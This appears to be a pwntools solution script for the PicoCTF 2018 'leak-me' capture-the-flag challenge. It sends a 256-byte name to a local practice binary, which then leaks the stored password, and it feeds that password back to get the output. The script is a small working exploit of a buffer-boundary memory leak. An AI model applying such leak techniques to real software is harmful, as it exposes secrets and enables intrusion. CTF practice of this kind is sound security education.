from pwn import *
p=process("./PicoCTF_2018_leak-me")
p.recvuntil(b'What is your name?\n')
p.sendline(b'a'*256)
p.recvuntil(b',')
password=p.recvline().strip()
print(password)

p1=process('./PicoCTF_2018_leak-me')
p1.recvuntil(b'What is your name?\n')
p1.sendline(b'cccc')
p1.recvuntil(b'Please Enter the Password.\n')
p1.sendline(password)
print(p1.recvall())